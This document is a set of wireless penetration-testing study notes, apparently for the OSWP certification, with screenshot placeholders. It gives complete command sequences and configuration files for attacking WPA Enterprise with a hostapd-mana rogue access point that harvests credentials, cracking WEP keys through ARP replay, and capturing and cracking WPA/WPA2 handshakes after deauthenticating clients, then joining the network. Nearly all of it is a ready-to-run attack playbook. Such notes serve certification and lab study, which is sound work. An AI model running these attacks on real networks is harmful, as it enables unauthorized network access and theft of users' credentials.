# OSWP Attacks and Techniques




# Attacking WPA Enterprise

1. Run an `airodump-ng`  scan: 

```
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --band abg
```

We find our WPA Enterprise network of interest:

**Screenshot of initial airodump screenshot goes here:**
![](Files/image.png)

  

  

  

2. We try a more targeted scan: 

```
sudo airodump-ng wlan0mon --bssid <BSSID>  --channel <CHANNEL> -w <FILE_PREFIX> --output-format pcap
```

**Screenshot of targeted airodump goes here:**

![](Files/image.png)

  

  

3. We open a new terminal session and De-authenticate all clients on the Wireless network to capture a 4-way handshake

```
sudo aireplay-ng -0 10 -a <WIFI NETWORK MAC ADDRESS> -c  <CLIENT MAC ADDRESS> wlan0mon
```

**Screenshot of capturing 4-way handshake:**

![](Files/image.png)

**Screenshot of de-authenticating the client:**

![](Files/image.png)

  

  

4. After capturing  a 4-way handshake, we open up the PCAP file we captured in `wireshark` . We use the `wireshark`  filter `tls`  so we can find the RADIUS certificate. Specifically, we look for a packet with the info **“Server Hello, Certificate, Server Key Exchange, Server Hello Done”**

```
tls
```

**Screenshot of capturing tls certificate in the PCAP:**

![](Files/image.png)

  

  

5. In the frame inspection area of `wireshark` , we navigate to **“Transport Layer Security”** > **“TLSv1.2 Record Layer: Handshake Protocol: Certificate”** > **“Handshake Protocol: Handshake”** > **“Certificates”** > **“1st Certificate”** > Right-click > Choose **“Export Bytes”** and save our certificate as a `.der`  file

**Screenshot of Certificate field Goes here:**

![](Files/image.png)

  
We also take a look at the `identity`  response that the 4-way handshake reveals is connecting to the network. We find an `identity`  frame, and we take note of the identity / username. The format should be `DOMAIN\user`  or something similar. 

  

To grab the identity, we click **Edit** > **Find Packet** , and we search for the string **“Response, Identity”.** Once we find Identity response packet, we can grab the identity by expanding  the **“Extensible Authentication Protocol”** field in the frame inspector, and look for the **“Identity”** field. 

**Screenshot of Identity / Username:**

![](Files/image.png)

  

5. After saving the RADIUS TLS certificate, we print it out to text: 

```
openssl x509  -inform der -in <CERTIFICATE>.der -text

```

**Screenshot of certificate:**

![](Files/image.png)

  

  

6. We need to start `freeradius`  to setup a rogue access point that mimics the legitimate access point, so we can extract any credentials. To do this, we have to edit 2 files `ca.cnf`  and `server.cnf` . To install `freeradius` , we can install via the command `sudo apt install freeradius -y` : 

    - `server.cnf` : 

```
sudo vim /etc/freeradius/3.0/certs/server.cnf

```

  

```
[server]
countryName  = US
stateOrProvinceName = CA
localityName = San Francisco
organizationName = ubuntuguest
emailAddress = ca@ubuntuguest
commonName = "ubuntuguest"

```

**Screenshot of `server.cnf`  file:** 

![](Files/image.png)

  

   `ca.cnf` : 

```
sudo vim /etc/freeradius/3.0/certs/ca.cnf

```

  

```
[certificate_authority]
countryName  = US
stateOrProvinceName = CA
localityName = San Francisco
organizationName = ubuntuguest
emailAddress = admin@ubuntuguest
commonName = "ubuntuguest"

```

**Screenshot of `ca.cnf`  file:** 

![](Files/image.png)

  

  

7. After making necessary edits, we go ahead and remove the `dh`  Diffie hellman default certificate, and create the certificates that our rogue access point should create: 

```
sudo rm -rf /etc/freeradius/3.0/certs/dh

```

  

  

8. Now, we can destroy the rest of the certificates for a clean start:

```
sudo su - && cd /etc/freeradius/3.0/certs && make destroycerts
```

  

  

9. We can now create the necessary certificates: 

```
sudo su - && cd /etc/freeradius/3.0/certs && make
```

We get an error message at the very bottom, but this is fine since we are not concerned with client certificates.

 **Screenshot of error message:**

![](Files/image.png)

  

  

10. We can proceed with creating the configuration files for `hostapd-mana`  that will launch our rogue access point: 
- `mana.conf` :

```
sudo vim /etc/hostapd-mana/mana.conf
```

  

```
# Fill file above with these contents
# SSID of the AP
ssid=<SSID>

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=<CHANNEL>
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1


```

**Screenshot of mana.conf file:**

![](Files/image.png)

  

- `mana.eap_user` :

```
sudo vim /etc/hostapd-mana/mana.eap_user

```

  

```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

**Screenshot of mana.eap\_user file:**

![](Files/image.png)

  

  

11. We start up `hostapd-mana` to create our rogue access point: 

```
sudo hostapd-mana /etc/hostapd-mana/mana.conf

```

**Screenshot of running `hostapd-mana` :** 

![](Files/image.png)

  

  

12. After getting a connection back from a user, we get a series of hashes. We can use `hashcat`  to crack the hashes

**Screenshot of connection and user hashes**

![](Files/image.png)

  

Pipe the hash into a file

```
echo '<HASHCAT HASH>' > hash
```

  

Crack with `hashcat` : 

```
hashcat -a 0 -m 5500 <HASH FILE> /usr/share/wordlists/rockyou.txt

hashcat -a 0 -m 5500 <HASH FILE> /usr/share/john/passwords.lst

```

**Screenshot of cracked hash:**

![](Files/image.png)

  

  

13. We create a network config file to connect to the network with the identity we gathered from the PCAP file

```
network={
  ssid="<SSID>"
  scan_ssid=1
  key_mgmt=WPA-EAP
  eap=PEAP
  identity=<IDENTITY>
  password=<PASSWORD>
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}

```

**Screenshot of the identity we are logging in as from the 4-way handshake PCAP file:** 

![](Files/image.png)

  

  

14. We try to connect to the WiFi network using the config file we created in the previous step: 

```
sudo wpa_supplicant -Dnl80211 -i wlan0 -c <CONFIG FILE>.conf

# Grab IP from DHCP
sudo dhclient -v wlan0
```

**Screenshot of connecting to WiFi network:**

**![](Files/image.png)

  

15. We confirm that we are connected to the network

```
iwconfig
ip a
```

**Screenshot of wireless interface with new IP:**

**![](Files/image.png)

⁠

16. We navigate to the wireless network gateway `x.x.x.1`  

```
firefox x.x.x.1
```

**Screenshot of router / gateway page:** 

![](Files/image.png)

  

  

# Attacking WEP

1. Run an `airodump-ng`  scan: 

```
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --band abg
```

We find our WPA Enterprise network of interest:

**Screenshot of initial airodump screenshot goes here:**
![](Files/image.png)

  

  

  

2. We try a more targeted scan: 

```
sudo airodump-ng wlan0mon --bssid <BSSID>  --channel <CHANNEL> -w <FILE_PREFIX> --output-format pcap
```

**Screenshot of targeted airodump goes here:**

![](Files/image.png)

  

  

  

3. If we see that there is a client connected, use the `besside-ng`  tool to get the password, `aireplay-ng`  to create a fake access point and to do an ARP-request replay attack to generate traffic on the fake access point at the same time. We can open different terminal windows to run the commands simultaneously. 

```bash
# 1. Stop the airodump-ng scan

# 2. stop monitoring on wlan0
sudo airmon-ng stop wlan0

# 3. Kill any processes that may interfere
sudo airmon-ng check kill

# 4. Run besside-ng
sudo besside-ng -c <CHANNEL> -b <BSSID> wlan0

# 5. Take a pcap of the wireless traffic
sudo airodump-ng -c <CHANNEL> --bssid <Wifi AP MAC Address> -w wep wlan0 --output-format pcap

# 6. Create a fake access point
sudo aireplay-ng -1 3600 -q 10 -a <Wifi AP MAC Address> wlan0

# 7. Run an ARP request attack
sudo aireplay-ng --arpreplay -b <Wifi AP MAC Address> -h <MAC Address of Client> wlan0

```

**Screenshot of attack:**

![](Files/image.png)

  

  

  

4. In another terminal window, we can crack the pcap file we captured in the previous step. 

```
sudo aircrack-ng <PCAP FILE> /usr/share/wordlists/rockyou.txt

sudo aircrack-ng <PCAP FILE> /usr/share/john/password.lst

# Convert key to ASCII
sudo aircrack-ng -l ascii-key wep.cap
```

**Screenshot of cracking pcap file:**

⁠![](Files/image.png)

  

  

  

5. After finding the key, we can create a wireless configuration file to connect to the network: 

```
network={
  ssid="<SSID>"
  key_mgmt=NONE
  wep_key0=<PASSWORD>
  wep_tx_keyidx=0
}

```

  

Connect to the wireless network: 

```
sudo wpa_supplicant -D nl80211 -i wlan0 -c wep.conf

```

  

In another terminal, grab another IP address: 

```
sudo dhclient wlan0 -v

```

  

We can then attempt to connect to the default gateway endpoint (This IP should be address `x.x.x.1` ): 

```
firefox x.x.x.1

```

  

**Screenshot of connecting to wireless network:**

![](Files/image.png)

  

  

# Attacking WPA and WPA-2

1. Run an `airodump-ng`  scan: 

```
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --band abg
```

We find our WPA Enterprise network of interest:

**Screenshot of initial airodump screenshot goes here:  
**![](Files/image.png)

  

  

2. We try a more targeted scan: 

```
sudo airodump-ng wlan0mon --bssid <BSSID>  --channel <CHANNEL> -w <FILE_PREFIX> --output-format pcap
```

**Screenshot of targeted airodump goes here:**

![](Files/image.png)

  

  

3. If there are any clients, we can attempt to de-authenticate them all: 

```
sudo aireplay-ng -0 5 -a <BSSID> wlan0mon

```

  

  

4. We see that we get a WPA handshake during our `airodump-ng`  scan: 

**Screenshot of 4-way handshake:**

![](Files/image.png)

  

  

5. We can conclude the `airodump-ng`  scan and we can proceed to crack the 4-way handshake. 

```
sudo aircrack-ng <PCAP FILE> -w /usr/share/wordlists/rockyou.txt

sudo aircrack-ng <PCAP FILE> -w /usr/share/john/password.lst
```

**Screenshot of cracking 4-way handshake:**

![](Files/image.png)

  

  

6. After cracking the password, we can include the password inside of the network configuration file: 

  

- WiFi configuration file we can save as `wpa.conf` 

```
network={
  ssid="<SSID>"
  key_mgmt=WPA-PSK
  psk="<PASSWORD>"
  proto=RSN
}

```

  

- Connect to the wireless network with that configuration file: 

```
sudo wpa_supplicant -D nl80211 -i wlan0 -c wpa.conf 

```

  

In a separate terminal, we can grab another IP address via DHCP:

```
sudo dhclient wlan0 -v
```

  

  

7. We confirm that we are on the network: 

```
iwconfig
```

**Screenshot of the wireless interface**

![](Files/image.png)


8. We browse to the router endpoint IP `x.x.x.1` in the browser: 

```
firefox x.x.x.1
```  